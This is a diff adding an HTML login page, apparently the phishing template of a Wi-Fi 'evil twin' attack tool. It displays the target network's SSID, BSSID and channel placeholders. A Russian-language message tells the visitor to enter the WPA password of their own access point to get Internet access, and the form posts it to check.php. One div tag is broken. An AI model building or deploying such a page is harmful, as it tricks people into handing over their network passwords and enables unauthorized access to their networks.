@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+	<html>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<head>
+	    <title>Login</title>
+	    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0"/>
+	<link rel="stylesheet" href="./jquery.mobile-1.3.2.css">
+	    <script src="./jquery-1.8.3.min.js"></script>
+	    <script src="jquery.mobile-1.3.2.js"></script>
+	    <style>
+		#login-button {
+		    margin-top: 30px;
+		}
+
+	.ui-grid-c {
+	    text-align : center;
+		margin-right: -50% !important;
+
+	}
+
+	.ui-block-b {
+	    text-align : left;
+
+	}
+
+	.ui-block-a {
+	    text-align : right;
+		margin-right: 10px !important;
+
+
+	}
+	    </style>
+	</head>
+	<body>
+	    <div data-role="page" id="login" data-theme="b">
+
+		<div data-role="content">
+		<fieldset>
+		    <form id="check-user" class="ui-body ui-body-a ui-corner-all" data-ajax="false" action="check.php" method="POST" >
+	<div class=ui-grid-c>
+<div class=ui-block-a>ESSID:</div>
+
+	      <div class=ui-block-b><b>Host_SSID</b></div>
+
+	      <div class=ui-block-a>BSSID:</div>
+
+	      <div class=ui-block-b><b>Host_MAC</b></div>
+
+	      <div class=ui-block-a>Chan:</div>
+
+	      <div class=ui-block-b><b>Host_CHAN</b></div>
+
+	    </div>
+
+	<br>
+
+	Для получения доступа в Интернет нужно ввести WPA пароль своей точки доступа.
+  <div class=ui-bloc
+			    <div data-role="fieldcontain">
+				<label for="password">Введите пароль:</label>
+				</div>
+				<input type="password" value="" name="key1" id="key1"/>
+
+			    <input type="submit" data-theme="b" name="submit" id="submit" data-inline="true" value="Отправить">
+			</fieldset>
+		    </form>
+		</div>
+
+		<div data-theme="a" data-role="footer" data-position="fixed">
+
+		</div>
+	    </div>
+	    <div data-role="page" id="second">
+		<div data-theme="a" data-role="top">
+		    <h3></h3>
+		</div>
+
+		<div data-role="content">
+
+		</div>
+
+		<div data-theme="a" data-role="footer" data-position="fixed">
+		</div>
+	    </div>
+	</body>
+	</html>
+
